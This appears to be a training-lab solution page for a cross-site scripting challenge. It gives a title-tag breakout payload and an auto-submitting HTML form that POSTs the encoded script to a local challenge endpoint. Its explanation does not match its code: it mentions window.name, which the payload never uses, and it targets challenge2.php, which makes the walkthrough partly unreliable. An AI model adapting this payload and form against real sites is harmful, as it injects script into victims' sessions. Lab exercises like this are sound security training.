# Challenge 5
Solution and further references for *challenge 5*.

<details>
 <summary>Spoiler: Solution for challenge 5</summary>

**Payload**:
Due to the limitation regarding the character set, one could for instance use `window.name` (= `name` on window scope.) to pass the required `document.domain` to the vulnerable code snippet. 

```html
</title><script>alert(document.domain)</script>
```

**Exploit**:
```html
<html>
  <body>
    <form action="http://127.0.0.1/challenge2.php" method="POST" id="attackForm">
      <input type="hidden" name="q" value="&lt;&#47;title&gt;&lt;script&gt;alert&#40;document&#46;domain&#41;&lt;&#47;script&gt;" />
      <input type="submit" value="Submit request" />
    </form>
  <script>attackForm.submit()</script>
  </body>
</html>
```
</details>

## References
Additional information:
* https://developer.mozilla.org/de/docs/Web/API/Window/name
* https://developer.mozilla.org/en-US/docs/Web/API/Window/open